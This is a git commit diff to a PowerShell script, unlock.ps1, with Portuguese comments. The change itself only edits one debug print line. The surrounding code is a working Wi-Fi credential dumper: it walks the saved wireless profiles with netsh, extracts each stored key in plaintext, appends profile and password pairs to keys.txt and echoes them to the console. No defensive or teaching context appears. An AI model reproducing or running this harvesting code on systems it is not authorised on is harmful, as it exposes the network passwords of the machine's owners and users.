34686833467b9cbcca049cad9bf3bee642d1730e
duo530 <cavaluslg@gmail.com>
2024-10-20 17:19:14 -0300

    Update unlock.ps1

--- unlock.ps1
+++ unlock.ps1
@@ -5,7 +5,7 @@ netsh wlan show profile | Select-String "All User Profile" | ForEach-Object {
     if ($key) { 
         $password = $key.ToString().Split(":")[1].Trim(); 
         "$profile : $password" | Out-File -FilePath "keys.txt" -Encoding utf8 -Append # Usar -Append para não sobrescrever
-        Write-Host "Chave encontrada para $profile: $password" # Adicionando saída para depuração
+        Write-Host "Chave encontrada para $profile : $password" # Adicionando saída para depuração
     } else {
         Write-Host "Nenhuma chave encontrada para $profile" # Adicionando saída para depuração
     }
